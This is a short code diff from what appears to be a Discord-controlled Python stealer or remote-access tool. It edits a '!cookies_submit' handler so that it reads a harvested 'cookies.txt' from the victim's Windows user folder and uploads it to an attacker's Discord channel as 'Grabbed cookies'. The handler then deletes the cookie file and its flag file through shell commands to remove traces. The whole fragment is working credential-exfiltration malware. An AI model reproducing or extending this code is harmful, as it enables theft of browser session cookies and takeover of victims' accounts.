@@ -10,11 +10,11 @@ import os
 # end of imports
 
 # !cookies_submit
-if os.path.exists('ready.cookies') and cookies_thread != None:
+if os.path.exists(f'C:\\Users\\{getuser()}\\ready.cookies') and cookies_thread != None:
     await asyncio.sleep(1)
-    reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File('cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
-    subprocess.run('del cookies.txt', shell=True)
-    subprocess.run('del ready.cookies', shell=True)
+    reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
+    subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
+    subprocess.run(f'del C:\\Users\\{getuser()}\\ready.cookies', shell=True)
     cookies_thread = None
 
 # on message
